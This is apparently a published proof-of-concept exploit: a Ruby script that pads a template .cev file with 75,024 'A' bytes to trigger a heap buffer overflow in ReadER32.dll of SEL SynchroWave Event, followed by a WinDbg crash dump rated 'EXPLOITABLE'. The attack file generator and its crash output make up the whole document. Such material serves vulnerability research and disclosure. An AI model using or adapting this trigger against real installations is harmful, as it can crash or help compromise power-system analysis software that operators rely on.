#!/usr/bin/env ruby
# SEL SynchroWave Event (1.5.1.472) contains a
# heap buffer overflow in ReadER32.dll (1.8.4.0). 
# 

fd = File.open("template.cev", "rb" )
new_eve = fd.read(fd.stat.size)
fd.close

data = "A" * 75024

fuzz = new_eve

x = File.new("fuzz.cev","wb")
x.write(fuzz.gsub(/FUZZ/, data))
x.close
__END__

Microsoft (R) Windows Debugger Version 6.9.0003.113 X86
Copyright (c) Microsoft Corporation. All rights reserved.

*** wait with pending attach
Symbol search path is: C:\Symbols
Executable search path is: 
ModLoad: 00340000 00782000   C:\Program Files\SEL\SEL SynchroWAVe Event\SEL.ReadER32.exe
(b5c.8a4): Access violation - code c0000005 (!!! second chance !!!)
eax=00000000 ebx=000001a1 ecx=00000001 edx=00000002 esi=1005677d edi=06016000
eip=1000c6d0 esp=06a3ef1c ebp=06006600 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\SEL\SEL SynchroWAVe Event\ReadER32.dll - 
ReadER32!Readata_HighAccuracy+0x920:
1000c6d0 f3a4            rep movs byte ptr es:[edi],byte ptr [esi]
*** WARNING: Unable to verify checksum for C:\Windows\assembly\NativeImages_v4.0.30319_32\mscorlib\d1265d6159ea876f9d63ea4c1361b587\mscorlib.ni.dll
*** ERROR: Module load completed but symbols could not be loaded for C:\Windows\assembly\NativeImages_v4.0.30319_32\mscorlib\d1265d6159ea876f9d63ea4c1361b587\mscorlib.ni.dll
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll - 
0:007> !analyze -v
FAULTING_IP: 
ReadER32!Readata_HighAccuracy+920
1000c6d0 f3a4            rep movs byte ptr es:[edi],byte ptr [esi]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 1000c6d0 (ReadER32!Readata_HighAccuracy+0x00000920)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000001
   Parameter[1]: 06016000
Attempt to write to address 06016000

FAULTING_THREAD:  000008a4

DEFAULT_BUCKET_ID:  STRING_DEREFERENCE

PROCESS_NAME:  SEL.ReadER32.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.

WRITE_ADDRESS:  06016000 

EXCEPTION_DOESNOT_MATCH_CODE:  This indicates a hardware error.
Instruction at 1000c6d0 does not read/write to 06016000

NTGLOBALFLAG:  2000000

APPLICATION_VERIFIER_FLAGS:  8000

PRIMARY_PROBLEM_CLASS:  STRING_DEREFERENCE

BUGCHECK_STR:  APPLICATION_FAULT_STRING_DEREFERENCE_CODE_ADDRESS_MISMATCH

IP_ON_HEAP:  060f02ff
The fault address in not in any loaded module, please check your build's rebase
log at <releasedir>\bin\build_logs\timebuild\ntrebase.log for module which may
contain the address if it were loaded.

FRAME_ONE_INVALID: 1

LAST_CONTROL_TRANSFER:  from 060f02ff to 1000c6d0

STACK_TEXT:  
WARNING: Stack unwind information not available. Following frames may be wrong.
06a3ef18 060f02ff 10056ab8 06a3f230 0310329c ReadER32!Readata_HighAccuracy+0x920
06a3ef1c 10056ab8 06a3f230 0310329c 00000002 0x60f02ff
06a3ef20 06a3f230 0310329c 00000002 0a000000 ReadER32!SetEmbeddedQuoteCharacter+0x461b8
06a3ef24 0310329c 00000002 0a000000 01985b0d 0x6a3f230
06a3f230 1000bd97 03103ad8 03103b30 06a3f454 0x310329c
06a3f510 6fcfab70 03103a94 06a3f580 6fd0da07 ReadER32!Readata_Peak+0x77
06a3f51c 6fd0da07 03103a0c 00000000 00000000 mscorlib_ni+0x2fab70
06a3f580 6fd0d956 00000000 03103a40 00000000 mscorlib_ni+0x30da07
06a3f594 6fd0d921 00000000 03103a40 00000000 mscorlib_ni+0x30d956
06a3f5b0 6fcd0bf2 03103a40 00000000 00000000 mscorlib_ni+0x30d921
06a3f5c8 71172552 01967fb0 06a3f628 7117f237 mscorlib_ni+0x2d0bf2
06a3f5d4 7117f237 06a3f674 06a3f618 712c8ad2 clr+0x2552
06a3f628 7117ff60 00000001 06a3f64c 06a3f74c clr!DllUnregisterServerInternal+0x3a83
06a3f6a8 7123b7ad 06a3f6e8 3ff08b14 06a3f8f4 clr!DllUnregisterServerInternal+0x47ac
06a3f81c 71184306 06a3f998 01967fb0 06a3f93c clr!DllGetActivationFactoryImpl+0x235d
06a3f834 71184374 3ff08574 06a3f93c 00000000 clr!DllUnregisterServerInternal+0x8b52
06a3f8d8 71184441 3ff08498 7123b5a9 01967fb0 clr!DllUnregisterServerInternal+0x8bc0
06a3f934 711844af 00000001 00000000 00000001 clr!DllUnregisterServerInternal+0x8c8d
06a3f958 7123b669 00000001 00000002 3ff08478 clr!DllUnregisterServerInternal+0x8cfb
06a3f9d4 7130a909 01967fb0 00000000 00000000 clr!DllGetActivationFactoryImpl+0x2219
06a3faf4 75c33c45 0194e598 06a3fb40 775337f5 clr!GetMetaDataInternalInterfaceFromPublic+0x1b084
06a3fb00 775337f5 0194e598 71a97821 00000000 KERNEL32!BaseThreadInitThunk+0xe
06a3fb40 775337c8 7130a8c0 0194e598 00000000 ntdll!__RtlUserThreadStart+0x70
06a3fb58 00000000 7130a8c0 0194e598 00000000 ntdll!_RtlUserThreadStart+0x1b


FOLLOWUP_IP: 
ReadER32!Readata_HighAccuracy+920
1000c6d0 f3a4            rep movs byte ptr es:[edi],byte ptr [esi]

SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  ReadER32!Readata_HighAccuracy+920

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: ReadER32

IMAGE_NAME:  ReadER32.dll

DEBUG_FLR_IMAGE_TIMESTAMP:  52543733

STACK_COMMAND:  ~7s ; kb

FAILURE_BUCKET_ID:  STRING_DEREFERENCE_c0000005_ReadER32.dll!Readata_HighAccuracy

BUCKET_ID:  APPLICATION_FAULT_STRING_DEREFERENCE_CODE_ADDRESS_MISMATCH_ReadER32!Readata_HighAccuracy+920

Followup: MachineOwner 
---------
0:007> !exploitable
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at ReadER32!Readata_HighAccuracy+0x0000000000000920 (Hash=0x6a467958.0x0340595c)

User mode write access violations that are not near NULL are exploitable.

